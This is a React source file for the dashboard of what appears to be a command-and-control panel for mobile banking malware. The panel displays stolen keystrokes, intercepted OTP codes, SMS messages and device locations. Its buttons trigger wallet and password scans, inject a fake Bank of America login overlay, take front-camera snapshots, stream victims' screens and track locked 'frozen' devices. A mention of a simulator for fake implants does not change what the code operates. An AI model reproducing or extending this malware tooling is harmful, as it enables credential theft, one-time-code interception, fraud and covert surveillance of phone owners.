import { useEffect } from 'react';
import { CMD, type Command, type ImplantEvent } from '@xrc/shared';
import { Bar, BarChart, Cell, ResponsiveContainer, Tooltip, XAxis, YAxis } from 'recharts';
import DeviceCard from '@/components/DeviceCard';
import StatCard from '@/components/StatCard';
import { useDeviceStore } from '@/stores/devices';

const EVENT_META: Record<string, { icon: string; cls: string }> = {
  info: { icon: 'ℹ', cls: 'text-slate-500' },
  keylog: { icon: '⌨', cls: 'text-sky-300' },
  otp: { icon: '🔐', cls: 'text-amber-300' },
  sms: { icon: '✉', cls: 'text-slate-400' },
  notif: { icon: '🔔', cls: 'text-slate-400' },
  location: { icon: '📍', cls: 'text-emerald-300' },
  capture: { icon: '📦', cls: 'text-fuchsia-300' },
  scan: { icon: '🔍', cls: 'text-cyan-300' },
  status: { icon: '⚡', cls: 'text-amber-300' },
  error: { icon: '✖', cls: 'text-rose-300' },
};

const MODEL_COLORS = ['#22d3ee', '#818cf8', '#f472b6', '#34d399', '#fbbf24', '#f87171', '#a78bfa', '#2dd4bf'];

function feedText(e: ImplantEvent): string {
  if (e.kind === 'keylog') return `${e.app} → "${e.text}"`;
  if (e.kind === 'otp') return `OTP ${e.code} from ${e.source}`;
  if (e.kind === 'sms') return `[${e.from}] ${e.text}`;
  if (e.kind === 'notif') return `${e.app}: ${e.text}`;
  if (e.kind === 'location') return `${e.lat.toFixed(4)}, ${e.lng.toFixed(4)}`;
  if (e.kind === 'capture') return `${e.type} capture${e.url ? ` → ${e.url}` : ''}`;
  if (e.kind === 'scan') return `${e.type} scan`;
  if (e.kind === 'status') return `status → ${e.status}`;
  if (e.kind === 'error') return e.message;
  return 'device info updated';
}

export default function Dashboard() {
  const devices = useDeviceStore((s) => s.devices);
  const stats = useDeviceStore((s) => s.stats);
  const events = useDeviceStore((s) => s.events);
  const send = useDeviceStore((s) => s.send);
  const load = useDeviceStore((s) => s.load);

  useEffect(() => {
    void load();
    const t = window.setInterval(() => void load(), 15000);
    return () => window.clearInterval(t);
  }, [load]);

  const chartData = Object.entries(stats?.byModel ?? {}).map(([name, value]) => ({ name, value }));
  const target = devices.find((d) => d.status === 'online') ?? devices[0];

  const quick = async (command: Command) => {
    if (!target) return;
    await send(target.id, command);
  };

  return (
    <div className="space-y-6">
      {/* quick actions */}
      <div className="rounded-xl border border-slate-800 bg-surface p-4">
        <div className="text-[10px] font-bold tracking-widest text-slate-500 mb-3">
          QUICK ACTIONS
          {target && <span className="text-slate-600 normal-case tracking-normal"> · target: {target.name}</span>}
        </div>
        <div className="flex flex-wrap gap-2">
          <button
            onClick={() => void quick({ cmd: CMD.WALLET_SCAN })}
            className="rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-3 py-2 text-xs font-bold text-cyan-300 hover:bg-cyan-500/20"
          >
            🔍 Wallet Scanner
          </button>
          <button
            onClick={() => void quick({ cmd: CMD.PASS_SCAN })}
            className="rounded-lg border border-violet-500/40 bg-violet-500/10 px-3 py-2 text-xs font-bold text-violet-300 hover:bg-violet-500/20"
          >
            🔑 Password Scanner
          </button>
          <button
            onClick={() => void quick({ cmd: CMD.OVERLAY, slug: 'bank-of-america-login', url: '/p/bank-of-america-login/overlay' })}
            className="rounded-lg border border-fuchsia-500/40 bg-fuchsia-500/10 px-3 py-2 text-xs font-bold text-fuchsia-300 hover:bg-fuchsia-500/20"
          >
            🎯 Inject Overlay
          </button>
          <button
            onClick={() => void quick({ cmd: CMD.CAMERA, cam: 'front', action: 'snap' })}
            className="rounded-lg border border-slate-600 bg-slate-900 px-3 py-2 text-xs font-bold text-slate-300 hover:bg-slate-800"
          >
            📷 Camera Snap
          </button>
          <button
            onClick={() => void quick({ cmd: CMD.SCREEN, action: 'start', fps: 5 })}
            className="rounded-lg border border-slate-600 bg-slate-900 px-3 py-2 text-xs font-bold text-slate-300 hover:bg-slate-800"
          >
            🖥 Stream
          </button>
          <button
            onClick={() => void quick({ cmd: CMD.INFO })}
            className="rounded-lg border border-slate-600 bg-slate-900 px-3 py-2 text-xs font-bold text-slate-300 hover:bg-slate-800"
          >
            ℹ Refresh Info
          </button>
        </div>
      </div>

      {/* stats */}
      <div className="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-6 gap-3">
        <StatCard label="DEVICES" value={stats?.totalDevices ?? 0} sub="total registered" />
        <StatCard label="ONLINE" value={stats?.online ?? 0} accent="text-emerald-400" sub="jittered heartbeat 30–90s" />
        <StatCard label="FROZEN" value={stats?.frozen ?? 0} accent="text-rose-400" sub="locked devices" />
        <StatCard label="KEYLOGS 24H" value={stats?.keylogs24h ?? 0} accent="text-sky-300" sub="accessibility events" />
        <StatCard label="OTP 24H" value={stats?.otps24h ?? 0} accent="text-amber-300" sub="SMS + notification pipeline" />
        <StatCard label="CAPTURES 24H" value={stats?.captures24h ?? 0} accent="text-fuchsia-300" sub="camera · mic · screen" />
      </div>

      {/* devices + feed */}
      <div className="grid gap-4 xl:grid-cols-3">
        <div className="xl:col-span-2 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-slate-500">ACTIVE DEVICES</div>
          {devices.length === 0 ? (
            <div className="rounded-xl border border-slate-800 bg-surface p-10 text-center text-sm text-slate-500">
              No devices connected. Run{' '}
              <code className="text-cyan-300">npm run sim -w @xrc/server</code>{' '}
              to spawn a fake implant.
            </div>
          ) : (
            <div className="grid gap-3 sm:grid-cols-2">
              {devices.map((d) => (
                <DeviceCard key={d.id} device={d} />
              ))}
            </div>
          )}
          <div className="rounded-xl border border-slate-800 bg-surface p-4">
            <div className="text-[10px] font-bold tracking-widest text-slate-500 mb-3">DEVICES BY MODEL</div>
            {chartData.length === 0 ? (
              <div className="text-xs text-slate-600">no data</div>
            ) : (
              <ResponsiveContainer width="100%" height={160}>
                <BarChart data={chartData} margin={{ top: 4, right: 8, left: -24, bottom: 0 }}>
                  <XAxis dataKey="name" tick={{ fill: '#64748b', fontSize: 10 }} axisLine={{ stroke: '#1e293b' }} tickLine={false} />
                  <YAxis tick={{ fill: '#64748b', fontSize: 10 }} axisLine={false} tickLine={false} allowDecimals={false} />
                  <Tooltip
                    contentStyle={{ background: '#0f172a', border: '1px solid #1e293b', borderRadius: 8, fontSize: 12 }}
                    labelStyle={{ color: '#e2e8f0' }}
                    cursor={{ fill: 'rgba(34,211,238,0.06)' }}
                  />
                  <Bar dataKey="value" radius={[4, 4, 0, 0]}>
                    {chartData.map((_, i) => (
                      <Cell key={i} fill={MODEL_COLORS[i % MODEL_COLORS.length]} />
                    ))}
                  </Bar>
                </BarChart>
              </ResponsiveContainer>
            )}
          </div>
        </div>

        {/* live feed */}
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <div className="text-[10px] font-bold tracking-widest text-slate-500">LIVE EVENT FEED</div>
            <button
              onClick={() => useDeviceStore.getState().clearEvents()}
              className="text-[10px] text-slate-600 hover:text-slate-300"
            >
              clear
            </button>
          </div>
          <div className="rounded-xl border border-slate-800 bg-surface p-3 h-[520px] overflow-y-auto space-y-1.5 font-mono text-[11px]">
            {events.length === 0 && <div className="text-slate-600 text-center py-8">no events yet</div>}
            {events.map((e, i) => {
              const meta = EVENT_META[e.kind] ?? EVENT_META.info;
              return (
                <div key={i} className={`${meta.cls} break-words`}>
                  <span className="text-slate-600">{new Date(e.localTs).toLocaleTimeString()}</span>{' '}
                  {meta.icon} {feedText(e)} <span className="text-slate-600">[{e.deviceId}]</span>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
                                                             }
